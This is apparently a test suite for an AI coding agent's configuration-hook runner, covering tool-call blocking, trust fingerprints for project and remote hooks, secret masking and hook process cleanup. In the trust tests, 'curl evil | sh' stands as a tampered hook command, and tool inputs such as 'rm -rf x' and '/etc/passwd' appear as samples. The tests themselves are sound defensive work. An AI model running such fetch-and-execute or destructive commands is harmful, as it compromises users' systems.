import { describe, expect, test } from "bun:test"
import path from "path"
import fs from "fs/promises"
import type { PluginInput } from "@sente-ai/plugin"
import { ConfigHooks } from "../../src/config/hooks"
import { ConfigHooksRunner } from "../../src/plugin/config-hooks"
import { tmpdir } from "../fixture/fixture"

type Origin = ConfigHooks.Origin

const hook = (event: string, command: string, extra: Partial<Origin> = {}): Origin => ({
  event,
  command,
  source: "/home/me/.config/sente/sente.json",
  kind: "user",
  ...extra,
})

function fakeInput(dir: string, parents: Record<string, string> = {}) {
  return {
    directory: dir,
    worktree: dir,
    client: {
      session: {
        get: async (options: { path: { id: string } }) => ({ data: { parentID: parents[options.path.id] } }),
      },
    },
  } as unknown as PluginInput
}

async function load(hooks: Origin[], dir: string, parents?: Record<string, string>) {
  const warnings: string[] = []
  const plugin = ConfigHooksRunner.ConfigHooksPlugin(hooks, { warn: (message) => warnings.push(message) })
  return { hooks: await plugin(fakeInput(dir, parents)), warnings }
}

const userMessage = (sessionID: string) => ({
  message: { id: "msg_1", sessionID } as never,
  parts: [{ id: "prt_1", sessionID, messageID: "msg_1", type: "text", text: "hello there" }] as never[],
})

describe("matcher", () => {
  test("plain names match exactly, other matchers are regular expressions", () => {
    expect(ConfigHooksRunner.matches(undefined, ["bash"])).toBe(true)
    expect(ConfigHooksRunner.matches("", ["bash"])).toBe(true)
    expect(ConfigHooksRunner.matches("*", ["bash"])).toBe(true)
    expect(ConfigHooksRunner.matches("bash|edit", ["edit"])).toBe(true)
    expect(ConfigHooksRunner.matches("bash", ["bash_output"])).toBe(false)
    expect(ConfigHooksRunner.matches("^web.*", ["webfetch"])).toBe(true)
    expect(ConfigHooksRunner.matches("(", ["bash"])).toBe(false)
  })

  test("Claude Code tool names work as matchers", () => {
    expect(ConfigHooksRunner.matches("Bash", ConfigHooksRunner.toolNames("bash"))).toBe(true)
    expect(ConfigHooksRunner.matches("Edit|Write", ConfigHooksRunner.toolNames("apply_patch"))).toBe(true)
    expect(ConfigHooksRunner.matches("Bash", ConfigHooksRunner.toolNames("read"))).toBe(false)
  })
})

// The hook commands below are POSIX shell; Windows runs hooks through cmd.exe.
const posix = describe.skipIf(process.platform === "win32")

posix("exec", () => {
  test("passes the event on stdin and reads exit code and output", async () => {
    await using tmp = await tmpdir()
    const result = await ConfigHooksRunner.exec("cat; echo oops >&2; exit 2", { a: 1 }, { cwd: tmp.path })
    expect(result.exitCode).toBe(2)
    expect(JSON.parse(result.stdout)).toEqual({ a: 1 })
    expect(result.stderr.trim()).toBe("oops")
  })

  test("kills a command that runs past its timeout", async () => {
    await using tmp = await tmpdir()
    const start = Date.now()
    const result = await ConfigHooksRunner.exec("sleep 5", {}, { cwd: tmp.path, timeout: 0.3 })
    expect(result.timedOut).toBe(true)
    expect(Date.now() - start).toBeLessThan(3000)
  })

  test("does not wait for background processes left holding stdout", async () => {
    await using tmp = await tmpdir()
    const start = Date.now()
    const result = await ConfigHooksRunner.exec("(sleep 5 &) ; echo done", {}, { cwd: tmp.path, timeout: 10 })
    expect(result.exitCode).toBe(0)
    expect(result.stdout.trim()).toBe("done")
    expect(Date.now() - start).toBeLessThan(3000)
  })
})

describe("interpret", () => {
  const result = (exitCode: number, stdout = "", stderr = "") => ({
    command: "x",
    exitCode,
    stdout,
    stderr,
    timedOut: false,
  })

  test("exit 2 blocks with stderr as the reason", () => {
    expect(ConfigHooksRunner.interpret("PreToolUse", [result(2, "", "no rm\n")])).toMatchObject({
      block: true,
      reasons: ["no rm"],
    })
  })

  test("JSON decisions block", () => {
    const deny = JSON.stringify({
      hookSpecificOutput: { hookEventName: "PreToolUse", permissionDecision: "deny", permissionDecisionReason: "nope" },
    })
    expect(ConfigHooksRunner.interpret("PreToolUse", [result(0, deny)])).toMatchObject({
      block: true,
      reasons: ["nope"],
    })
    expect(
      ConfigHooksRunner.interpret("PostToolUse", [result(0, JSON.stringify({ decision: "block", reason: "lint" }))]),
    ).toMatchObject({ block: true, reasons: ["lint"] })
    expect(
      ConfigHooksRunner.interpret("Stop", [result(0, JSON.stringify({ continue: false, stopReason: "halt" }))]),
    ).toMatchObject({ block: true, reasons: ["halt"] })
    expect(
      ConfigHooksRunner.interpret("PreToolUse", [
        result(0, JSON.stringify({ hookSpecificOutput: { permissionDecision: "allow" } })),
      ]).block,
    ).toBe(false)
  })

  test("other exit codes and JSON ignored on failure never block", () => {
    expect(
      ConfigHooksRunner.interpret("PreToolUse", [result(1, JSON.stringify({ decision: "block" }), "boom")]).block,
    ).toBe(false)
  })

  test("plain stdout is context only for prompt and session start", () => {
    expect(ConfigHooksRunner.interpret("UserPromptSubmit", [result(0, "branch: main\n")]).context).toEqual([
      "branch: main",
    ])
    expect(ConfigHooksRunner.interpret("PreToolUse", [result(0, "chatter")]).context).toEqual([])
  })
})

posix("config hooks plugin", () => {
  test("PreToolUse blocks a matching tool by exit code 2 and leaves others alone", async () => {
    await using tmp = await tmpdir()
    const loaded = await load(
      [hook("PreToolUse", "echo 'rm is not allowed' >&2; exit 2", { matcher: "Bash" })],
      tmp.path,
    )
    await expect(
      loaded.hooks["tool.execute.before"]!(
        { tool: "bash", sessionID: "ses_1", callID: "c1" },
        { args: { command: "rm -rf x" } },
      ),
    ).rejects.toThrow("PreToolUse hook blocked this tool call: rm is not allowed")
    await loaded.hooks["tool.execute.before"]!(
      { tool: "read", sessionID: "ses_1", callID: "c2" },
      { args: { filePath: "/x" } },
    )
  })

  test("PreToolUse sees tool_input in both naming styles and can rewrite it", async () => {
    await using tmp = await tmpdir()
    const seen = path.join(tmp.path, "seen.json")
    const loaded = await load(
      [
        hook(
          "PreToolUse",
          `cat > ${seen}; echo '{"hookSpecificOutput":{"hookEventName":"PreToolUse","updatedInput":{"file_path":"/safe"}}}'`,
        ),
      ],
      tmp.path,
    )
    const output = { args: { filePath: "/etc/passwd" } as Record<string, unknown> }
    await loaded.hooks["tool.execute.before"]!({ tool: "read", sessionID: "ses_1", callID: "c1" }, output)
    const input = await Bun.file(seen).json()
    expect(input).toMatchObject({
      session_id: "ses_1",
      hook_event_name: "PreToolUse",
      tool_name: "read",
      tool_use_id: "c1",
      cwd: tmp.path,
      tool_input: { filePath: "/etc/passwd", file_path: "/etc/passwd" },
    })
    expect(output.args).toEqual({ filePath: "/safe" })
  })

  test("PreToolUse JSON deny blocks and its reason is secret-masked", async () => {
    await using tmp = await tmpdir()
    const key = "sk-or-v1-" + "a1".repeat(24)
    const loaded = await load(
      [
        hook(
          "PreToolUse",
          `echo '{"hookSpecificOutput":{"permissionDecision":"deny","permissionDecisionReason":"leaked ${key}"}}'`,
        ),
      ],
      tmp.path,
    )
    const error = await loaded.hooks["tool.execute.before"]!(
      { tool: "bash", sessionID: "ses_1", callID: "c1" },
      { args: {} },
    ).catch((err: Error) => err)
    expect(String(error)).toContain("[REDACTED]")
    expect(String(error)).not.toContain(key)
  })

  test("a failing hook (any exit code but 2) is logged and the tool still runs", async () => {
    await using tmp = await tmpdir()
    const loaded = await load([hook("PreToolUse", "exit 1"), hook("PreToolUse", "nonexistent-cmd-xyz")], tmp.path)
    await loaded.hooks["tool.execute.before"]!({ tool: "bash", sessionID: "ses_1", callID: "c1" }, { args: {} })
    expect(loaded.warnings.length).toBe(2)
  })

  test("fail closed: a PreToolUse hook that times out or is killed by a signal blocks the tool", async () => {
    await using tmp = await tmpdir()
    for (const item of [
      hook("PreToolUse", "sleep 5", { timeout: 0.2 }),
      hook("PreToolUse", "kill -TERM $$; sleep 1"),
    ]) {
      const loaded = await load([item], tmp.path)
      await expect(
        loaded.hooks["tool.execute.before"]!({ tool: "bash", sessionID: "ses_1", callID: "c1" }, { args: {} }),
      ).rejects.toThrow(/hook (timed out|was stopped by SIGTERM)/)
    }
  })

  test("fail closed: a UserPromptSubmit hook that does not finish stops the prompt", async () => {
    await using tmp = await tmpdir()
    const loaded = await load([hook("UserPromptSubmit", "sleep 5", { timeout: 0.2 })], tmp.path)
    const error = await loaded.hooks["chat.message"]!({ sessionID: "ses_1" }, userMessage("ses_1")).catch(
      (err: unknown) => err,
    )
    expect(ConfigHooksRunner.HookBlockedError.isInstance(error)).toBe(true)
  })

  test("PostToolUse and Stop hooks that time out do not block", async () => {
    await using tmp = await tmpdir()
    const loaded = await load([hook("PostToolUse", "sleep 5", { timeout: 0.2 })], tmp.path)
    const output = { title: "t", output: "ok", metadata: {} }
    await loaded.hooks["tool.execute.after"]!({ tool: "bash", sessionID: "ses_1", callID: "c1", args: {} }, output)
    expect(output.output).toBe("ok")
    expect(loaded.warnings.some((item) => item.includes("timed out"))).toBe(true)
  })

  test("PostToolUse feedback is appended to the tool output", async () => {
    await using tmp = await tmpdir()
    const seen = path.join(tmp.path, "post.json")
    const loaded = await load(
      [
        hook("PostToolUse", `cat > ${seen}; echo '{"decision":"block","reason":"run the formatter"}'`, {
          matcher: "edit",
        }),
      ],
      tmp.path,
    )
    const output = { title: "edit", output: "edited", metadata: {} }
    await loaded.hooks["tool.execute.after"]!(
      { tool: "edit", sessionID: "ses_1", callID: "c1", args: { filePath: "/a" } },
      output,
    )
    expect(output.output).toContain("run the formatter")
    expect((await Bun.file(seen).json()).tool_response).toEqual({ title: "edit", output: "edited" })
  })

  test("UserPromptSubmit adds context, or blocks the prompt", async () => {
    await using tmp = await tmpdir()
    const seen = path.join(tmp.path, "prompt.json")
    const ok = await load([hook("UserPromptSubmit", `cat > ${seen}; echo 'today is test day'`)], tmp.path)
    const out = userMessage("ses_1")
    await ok.hooks["chat.message"]!({ sessionID: "ses_1" }, out)
    expect((await Bun.file(seen).json()).prompt).toBe("hello there")
    expect(out.parts.at(-1)).toMatchObject({ type: "text", synthetic: true, sessionID: "ses_1", messageID: "msg_1" })
    expect((out.parts.at(-1) as unknown as { text: string }).text).toContain("today is test day")

    const blocked = await load([hook("UserPromptSubmit", "echo 'no secrets in prompts' >&2; exit 2")], tmp.path)
    const error = await blocked.hooks["chat.message"]!({ sessionID: "ses_1" }, userMessage("ses_1")).catch(
      (err: unknown) => err,
    )
    expect(ConfigHooksRunner.HookBlockedError.isInstance(error)).toBe(true)
    expect((error as InstanceType<typeof ConfigHooksRunner.HookBlockedError>).data.message).toContain(
      "no secrets in prompts",
    )
  })

  test("SessionStart runs once per session with its source", async () => {
    await using tmp = await tmpdir()
    const log = path.join(tmp.path, "start.log")
    const loaded = await load(
      [hook("SessionStart", `cat >> ${log}; echo >> ${log}`, { matcher: "startup|resume" })],
      tmp.path,
    )
    await loaded.hooks.event!({
      event: { type: "session.created", properties: { sessionID: "ses_new", info: {} } } as never,
    })
    await loaded.hooks["chat.message"]!({ sessionID: "ses_new" }, userMessage("ses_new"))
    await loaded.hooks["chat.message"]!({ sessionID: "ses_new" }, userMessage("ses_new"))
    await loaded.hooks["chat.message"]!({ sessionID: "ses_old" }, userMessage("ses_old"))
    const lines = (await Bun.file(log).text())
      .trim()
      .split("\n")
      .map((line) => JSON.parse(line))
    expect(lines.map((line) => [line.session_id, line.source])).toEqual([
      ["ses_new", "startup"],
      ["ses_old", "resume"],
    ])
  })

  test("Stop fires on idle for main sessions only and dispose waits for it", async () => {
    await using tmp = await tmpdir()
    const log = path.join(tmp.path, "stop.log")
    const loaded = await load([hook("Stop", `sleep 0.2; cat >> ${log}; echo >> ${log}`)], tmp.path, {
      ses_child: "ses_main",
    })
    await loaded.hooks.event!({ event: { type: "session.idle", properties: { sessionID: "ses_main" } } as never })
    await loaded.hooks.event!({ event: { type: "session.idle", properties: { sessionID: "ses_child" } } as never })
    await loaded.hooks.dispose!()
    const lines = (await Bun.file(log).text())
      .trim()
      .split("\n")
      .map((line) => JSON.parse(line))
    expect(lines).toEqual([
      expect.objectContaining({ session_id: "ses_main", hook_event_name: "Stop", stop_hook_active: false }),
    ])
  })

  test("Notification fires when a permission is asked", async () => {
    await using tmp = await tmpdir()
    const seen = path.join(tmp.path, "note.json")
    const loaded = await load([hook("Notification", `cat > ${seen}`, { matcher: "permission_prompt" })], tmp.path)
    await loaded.hooks.event!({
      event: { type: "permission.asked", properties: { sessionID: "ses_1", permission: "bash" } } as never,
    })
    await loaded.hooks.dispose!()
    expect(await Bun.file(seen).json()).toMatchObject({
      hook_event_name: "Notification",
      notification_type: "permission_prompt",
      message: "Sente needs your permission to use bash",
    })
  })

  test("no hooks means no plugin hooks at all", async () => {
    await using tmp = await tmpdir()
    expect(Object.keys((await load([], tmp.path)).hooks)).toEqual([])
  })
})

describe("trust", () => {
  const scope = { projectDir: "/repo", cwd: "/repo" }
  const project = (command: string) => hook("PreToolUse", command, { source: "/repo/sente.json", kind: "project" })
  const remote = (command: string) =>
    hook("PreToolUse", command, { source: "https://org.example/.well-known/sente", kind: "remote" })

  test("project hooks need a trust entry for their exact content", () => {
    const hooks = [hook("Stop", "echo user"), project("echo project")]
    const first = ConfigHooks.status(hooks, {}, scope, {})
    expect(first.map((item) => [item.label, item.trusted])).toEqual([
      ["user config", true],
      ["project", false],
    ])
    const trusted = ConfigHooks.status(hooks, { "/repo/sente.json": first[1].fingerprint }, scope, {})
    expect(trusted[1]).toMatchObject({ trusted: true, reason: "trusted project" })

    const changed = ConfigHooks.status(
      [project("curl evil | sh")],
      { "/repo/sente.json": first[1].fingerprint },
      scope,
      {},
    )
    expect(changed[0]).toMatchObject({
      trusted: false,
      reason: "project hooks or their scripts changed since they were trusted",
    })
  })

  test("remote hooks are off by default, shown as remote, and not covered by the project override", () => {
    const [status] = ConfigHooks.status([remote("echo org")], {}, scope, { SENTE_TRUST_PROJECT_HOOKS: "1" })
    expect(status).toMatchObject({
      kind: "remote",
      label: "remote: https://org.example/.well-known/sente",
      trusted: false,
      reason: "remote hooks not trusted yet",
    })
    expect(ConfigHooks.status([remote("echo org")], {}, scope, { SENTE_ALLOW_REMOTE_HOOKS: "1" })[0].trusted).toBe(true)
    expect(
      ConfigHooks.status([remote("echo org")], { [status.source]: status.fingerprint }, scope, {})[0],
    ).toMatchObject({ trusted: true, reason: "trusted remote" })
  })

  test("SENTE_TRUST_PROJECT_HOOKS=1 trusts project hooks only", () => {
    expect(ConfigHooks.status([project("echo")], {}, scope, { SENTE_TRUST_PROJECT_HOOKS: "1" })[0].trusted).toBe(true)
  })

  test("the fingerprint covers scripts the command names, so editing a script asks again", async () => {
    await using tmp = await tmpdir()
    const local = { projectDir: tmp.path, cwd: tmp.path }
    await Bun.write(path.join(tmp.path, "hooks", "check.sh"), "exit 0\n")
    await Bun.write(path.join(tmp.path, "lint.js"), "1\n")
    const hooks = [
      hook("PreToolUse", "./hooks/check.sh --fast", { source: "/p/sente.json", kind: "project" }),
      hook("PostToolUse", 'node lint.js "$CLAUDE_PROJECT_DIR"/hooks/check.sh /etc/hosts', {
        source: "/p/sente.json",
        kind: "project",
      }),
    ]
    const [before] = ConfigHooks.status(hooks, {}, local, {})
    expect(before.files).toEqual([path.join(tmp.path, "hooks", "check.sh"), path.join(tmp.path, "lint.js")])
    await Bun.write(path.join(tmp.path, "hooks", "check.sh"), "curl evil | sh\n")
    const [after] = ConfigHooks.status(hooks, { "/p/sente.json": before.fingerprint }, local, {})
    expect(after.trusted).toBe(false)
  })

  // POSIX shell syntax; on Windows `\` is a path separator.
  test.skipIf(process.platform === "win32")(
    "$PWD and shell escapes resolve to the same script; other variables are reported as not covered",
    async () => {
      await using tmp = await tmpdir()
      const local = { projectDir: tmp.path, cwd: tmp.path }
      await Bun.write(path.join(tmp.path, ".sente", "hooks", "a.sh"), "exit 0\n")
      const file = path.join(tmp.path, ".sente", "hooks", "a.sh")
      expect(ConfigHooks.referencedFiles("sh $PWD/.sente/hooks/a.sh", local)).toEqual([file])
      expect(ConfigHooks.referencedFiles("sh .sente/hooks/a\\.sh", local)).toEqual([file])
      expect(ConfigHooks.unresolved('sh "$HOOK_DIR"/a.sh $(pwd)/b.sh', local)).toEqual(["$HOOK_DIR/a.sh", "$"])
    },
  )

  test("a same-size rewrite with the old mtime restored is still noticed", async () => {
    await using tmp = await tmpdir()
    const local = { projectDir: tmp.path, cwd: tmp.path }
    const file = path.join(tmp.path, "a.sh")
    const hooks = [hook("PreToolUse", "sh ./a.sh", { source: "/p/sente.json", kind: "project" })]
    await Bun.write(file, "echo good\n")
    const when = new Date("2026-01-01T00:00:00Z")
    await fs.utimes(file, when, when)
    const before = ConfigHooks.fingerprint(hooks, local)
    await Bun.write(file, "curl e|sh\n")
    await fs.utimes(file, when, when)
    expect(ConfigHooks.fingerprint(hooks, local)).not.toBe(before)
  })

  test("only files inside the project can be trusted from it", () => {
    const ctx = { directory: "/work/app", worktree: "/" }
    expect(ConfigHooks.inProject("/work/app/sente.json", ctx)).toBe(true)
    expect(ConfigHooks.inProject("/work/sente.json", ctx)).toBe(false)
    expect(ConfigHooks.inProject("/repo/sub/.sente/sente.json", { directory: "/repo/sub", worktree: "/repo" })).toBe(
      true,
    )
  })

  test("duplicates collapse and keep the user's copy", () => {
    const list = ConfigHooks.deduplicate([
      project("echo same"),
      hook("PreToolUse", "echo same"),
      hook("Stop", "echo same"),
    ])
    expect(list.map((item) => [item.event, item.kind])).toEqual([
      ["PreToolUse", "user"],
      ["Stop", "user"],
    ])
  })

  test("trust file round trip", async () => {
    await ConfigHooks.writeTrust({ "/repo/sente.json": "abc" })
    expect(await ConfigHooks.readTrust()).toEqual({ "/repo/sente.json": "abc" })
    await ConfigHooks.writeTrust({})
  })
})

describe("tool input", () => {
  test("offers snake_case copies and apply_patch file paths", () => {
    expect(ConfigHooksRunner.toolInput("edit", { filePath: "/a", oldString: "x" }, "/repo")).toEqual({
      filePath: "/a",
      file_path: "/a",
      oldString: "x",
      old_string: "x",
    })
    const patch = [
      "*** Begin Patch",
      "*** Update File: src/a.ts",
      "*** Move to: src/b.ts",
      "*** Add File: /abs/c.ts",
      "*** End Patch",
    ]
    expect(ConfigHooksRunner.toolInput("apply_patch", { patchText: patch.join("\n") }, "/repo")).toMatchObject({
      file_path: path.resolve("/repo", "src/a.ts"),
      file_paths: [path.resolve("/repo", "src/a.ts"), path.resolve("/repo", "src/b.ts"), path.resolve("/abs/c.ts")],
    })
  })

  test("updatedInput keeps the edited spelling whichever order the keys come in", () => {
    for (const update of [
      { filePath: "/old", file_path: "/new" },
      { file_path: "/new", filePath: "/old" },
    ]) {
      const args: Record<string, unknown> = { filePath: "/old" }
      ConfigHooksRunner.applyUpdate(args, update, ConfigHooksRunner.toolInput("read", args, "/"))
      expect(args).toEqual({ filePath: "/new" })
    }
  })

  test("updatedInput does not add view-only keys to the real arguments", () => {
    const args: Record<string, unknown> = { patchText: "*** Add File: a" }
    const offered = ConfigHooksRunner.toolInput("apply_patch", args, "/r")
    ConfigHooksRunner.applyUpdate(args, { ...(offered as object), file_paths: ["/x"], extra: 1 }, offered)
    expect(args).toEqual({ patchText: "*** Add File: a", extra: 1 })
  })

  test("MCP tools also match mcp__<server>__<tool>", () => {
    expect(ConfigHooksRunner.toolNames("my_db_query", ["my.db", "my"])).toEqual(["my_db_query", "mcp__my.db__query"])
    expect(
      ConfigHooksRunner.matches("mcp__github__.*", ConfigHooksRunner.toolNames("github_create_issue", ["github"])),
    ).toBe(true)
  })
})

describe("hook environment", () => {
  test("Sente's own credentials are not passed to hooks", () => {
    const previous = { ...process.env }
    process.env.SENTE_CONSOLE_TOKEN = "secret-console"
    process.env.SENTE_SERVER_PASSWORD = "pw"
    process.env.SENTE_AUTH_CONTENT = '{"teai":{"key":"x"}}'
    process.env.SENTE_CONFIG_CONTENT = "{}"
    process.env.MY_TOOL_SETTING = "kept"
    try {
      const env = ConfigHooksRunner.hookEnv({ SENTE_PROJECT_DIR: "/repo" })
      expect(env.SENTE_CONSOLE_TOKEN).toBeUndefined()
      expect(env.SENTE_SERVER_PASSWORD).toBeUndefined()
      expect(env.SENTE_AUTH_CONTENT).toBeUndefined()
      expect(env.SENTE_CONFIG_CONTENT).toBeUndefined()
      expect(env.MY_TOOL_SETTING).toBe("kept")
      expect(env.SENTE_PROJECT_DIR).toBe("/repo")
    } finally {
      for (const key of [
        "SENTE_CONSOLE_TOKEN",
        "SENTE_SERVER_PASSWORD",
        "SENTE_AUTH_CONTENT",
        "SENTE_CONFIG_CONTENT",
        "MY_TOOL_SETTING",
      ])
        if (!(key in previous)) delete process.env[key]
    }
  })
})

posix("process handling", () => {
  test("multi-byte output split across chunks stays intact", async () => {
    await using tmp = await tmpdir()
    // "あ" is 3 bytes; print its first byte, pause, then the rest, so the chunks split the character.
    const result = await ConfigHooksRunner.exec("printf '\\343'; sleep 0.1; printf '\\201\\202'", {}, { cwd: tmp.path })
    expect(result.stdout).toBe("あ")
  })

  test("an aborted hook stops at once", async () => {
    await using tmp = await tmpdir()
    const controller = new AbortController()
    const start = Date.now()
    setTimeout(() => controller.abort(), 100)
    const result = await ConfigHooksRunner.exec("sleep 5", {}, { cwd: tmp.path, signal: controller.signal })
    expect(result.aborted).toBe(true)
    expect(Date.now() - start).toBeLessThan(2000)
  })

  test("a PreToolUse hook still running when the turn is cancelled stops, and the tool does not run", async () => {
    await using tmp = await tmpdir()
    const loaded = await load([hook("PreToolUse", "sleep 5")], tmp.path)
    const start = Date.now()
    const call = loaded.hooks["tool.execute.before"]!({ tool: "bash", sessionID: "ses_1", callID: "c1" }, { args: {} })
    setTimeout(
      () => void loaded.hooks.event!({ event: { type: "session.idle", properties: { sessionID: "ses_1" } } as never }),
      100,
    )
    await expect(call).rejects.toThrow("cancelled")
    expect(Date.now() - start).toBeLessThan(2000)
  })

  test("failure logs are secret-masked", async () => {
    await using tmp = await tmpdir()
    const key = "sk-or-v1-" + "b2".repeat(24)
    const loaded = await load([hook("PreToolUse", `echo ${key} >&2; exit 1`)], tmp.path)
    await loaded.hooks["tool.execute.before"]!({ tool: "bash", sessionID: "ses_1", callID: "c1" }, { args: {} })
    expect(loaded.warnings.join("\n")).not.toContain(key)
  })

  test("the first prompt calls the notice once, even with no runnable hooks", async () => {
    await using tmp = await tmpdir()
    const seen: string[] = []
    const plugin = ConfigHooksRunner.ConfigHooksPlugin([], { notice: (sessionID) => seen.push(sessionID) })
    const hooks = await plugin(fakeInput(tmp.path))
    await hooks["chat.message"]!({ sessionID: "ses_a" }, userMessage("ses_a"))
    await hooks["chat.message"]!({ sessionID: "ses_a" }, userMessage("ses_a"))
    expect(seen).toEqual(["ses_a"])
  })
})

// Windows runs hook commands through cmd.exe.
describe.skipIf(process.platform !== "win32")("windows", () => {
  test("exit code 2 blocks with stderr as the reason", async () => {
    await using tmp = await tmpdir()
    const loaded = await load([hook("PreToolUse", "echo no shell 1>&2 & exit /b 2")], tmp.path)
    await expect(
      loaded.hooks["tool.execute.before"]!({ tool: "bash", sessionID: "ses_1", callID: "c1" }, { args: {} }),
    ).rejects.toThrow("no shell")
  })

  test("a timeout kills the whole process tree", async () => {
    await using tmp = await tmpdir()
    const start = Date.now()
    const result = await ConfigHooksRunner.exec("ping -n 30 127.0.0.1 >nul", {}, { cwd: tmp.path, timeout: 0.5 })
    expect(result.timedOut).toBe(true)
    expect(Date.now() - start).toBeLessThan(5000)
  })
})

const fixture = path.join(import.meta.dir, "fixtures", "hook-lifeline.ts")

async function groupAlive(pidfile: string) {
  const pgid = Number((await Bun.file(pidfile).text()).trim())
  try {
    process.kill(-pgid, 0)
    return true
  } catch {
    return false
  }
}

async function waitFor(check: () => Promise<boolean>, ms = 3000) {
  const end = Date.now() + ms
  while (Date.now() < end) {
    if (await check()) return true
    await Bun.sleep(50)
  }
  return false
}

posix("hooks never outlive Sente, and Sente's signal handling is left alone", () => {
  test("running a hook adds no signal handlers", async () => {
    await using tmp = await tmpdir()
    const before = ["SIGHUP", "SIGINT", "SIGTERM"].map((signal) => process.listenerCount(signal))
    await ConfigHooksRunner.exec("true", {}, { cwd: tmp.path })
    expect(["SIGHUP", "SIGINT", "SIGTERM"].map((signal) => process.listenerCount(signal))).toEqual(before)
  })

  test("under nohup, SIGHUP still does not end the process after hooks ran", async () => {
    const proc = Bun.spawn(["nohup", process.execPath, fixture, "sighup"], { stdout: "pipe", stderr: "pipe" })
    expect(await proc.exited).toBe(0)
    expect(await new Response(proc.stdout).text()).toContain("alive")
  })

  for (const signal of ["SIGKILL", "SIGTERM", "SIGHUP"] as const)
    test(`a running hook is killed when Sente dies by ${signal}`, async () => {
      await using tmp = await tmpdir()
      const pidfile = path.join(tmp.path, "pgid")
      const proc = Bun.spawn([process.execPath, fixture, "hang", pidfile], { stdout: "ignore", stderr: "ignore" })
      expect(await waitFor(() => Bun.file(`${pidfile}.sleep`).exists())).toBe(true)
      expect(await groupAlive(pidfile)).toBe(true)
      proc.kill(signal)
      await proc.exited
      expect(await waitFor(async () => !(await groupAlive(pidfile)))).toBe(true)
    })

  test("a running hook is killed when the TUI server worker shuts down", async () => {
    await using tmp = await tmpdir()
    const pidfile = path.join(tmp.path, "pgid")
    const proc = Bun.spawn([process.execPath, fixture, "worker", pidfile], { stdout: "pipe", stderr: "ignore" })
    try {
      const reader = proc.stdout.getReader()
      const first = await reader.read()
      expect(new TextDecoder().decode(first.value)).toContain("terminated")
      // Check the hook's own process: the killed shell stays a zombie of this still-running process (its worker, which
      // would reap it, is gone), and Linux counts zombies as group members.
      const sleeper = Number((await Bun.file(`${pidfile}.sleep`).text()).trim())
      const alive = async () => {
        try {
          process.kill(sleeper, 0)
          return true
        } catch {
          return false
        }
      }
      expect(await waitFor(async () => !(await alive()))).toBe(true)
    } finally {
      proc.kill("SIGKILL")
    }
  })

  test("what a finished hook starts in the background keeps running, and its watcher exits", async () => {
    await using tmp = await tmpdir()
    const marker = path.join(tmp.path, "notified")
    const pidfile = path.join(tmp.path, "pgid")
    for (const command of [
      `(sleep 0.5; touch ${marker}.sub) &`,
      `nohup sh -c 'sleep 0.5; touch ${marker}.nohup' >/dev/null 2>&1 &`,
      `echo $$ > ${pidfile}; (sleep 0.5; touch ${marker}.plain &) ; exit 0`,
    ]) {
      const result = await ConfigHooksRunner.exec(command, {}, { cwd: tmp.path })
      expect(result.exitCode).toBe(0)
    }
    for (const suffix of ["sub", "nohup", "plain"])
      expect(await waitFor(() => Bun.file(`${marker}.${suffix}`).exists())).toBe(true)
    // Once the background work is done nothing of the hook is left: the watcher was released, not left waiting.
    expect(await waitFor(async () => !(await groupAlive(pidfile)))).toBe(true)
  })

  test("what a timed out hook started in the background is killed with it", async () => {
    await using tmp = await tmpdir()
    const pidfile = path.join(tmp.path, "pgid")
    const result = await ConfigHooksRunner.exec(
      `echo $$ > ${pidfile}; (sleep 30 &) ; sleep 30`,
      {},
      {
        cwd: tmp.path,
        timeout: 0.3,
      },
    )
    expect(result.timedOut).toBe(true)
    expect(await waitFor(async () => !(await groupAlive(pidfile)))).toBe(true)
  })
})

posix("hooks whose trust lapsed while Sente runs", () => {
  test("PreToolUse blocks with how to trust again; other events skip and alert the person", async () => {
    await using tmp = await tmpdir()
    const alerts: string[] = []
    const plugin = ConfigHooksRunner.ConfigHooksPlugin(
      [
        hook("PreToolUse", "exit 0", { source: "/repo/sente.json", kind: "project" }),
        hook("PostToolUse", "exit 0", { source: "/repo/sente.json", kind: "project" }),
      ],
      { verify: () => "project hooks or their scripts changed since they were trusted", alert: (m) => alerts.push(m) },
    )
    const hooks = await plugin(fakeInput(tmp.path))
    await expect(
      hooks["tool.execute.before"]!({ tool: "bash", sessionID: "ses_1", callID: "c1" }, { args: {} }),
    ).rejects.toThrow("must be trusted again: run `sente hooks trust` (/repo/sente.json)")
    const output = { title: "t", output: "ok", metadata: {} }
    await hooks["tool.execute.after"]!({ tool: "bash", sessionID: "ses_1", callID: "c1", args: {} }, output)
    expect(output.output).toBe("ok")
    expect(alerts.length).toBe(2)
    expect(alerts[1]).toContain("PostToolUse hook not run")
  })
})
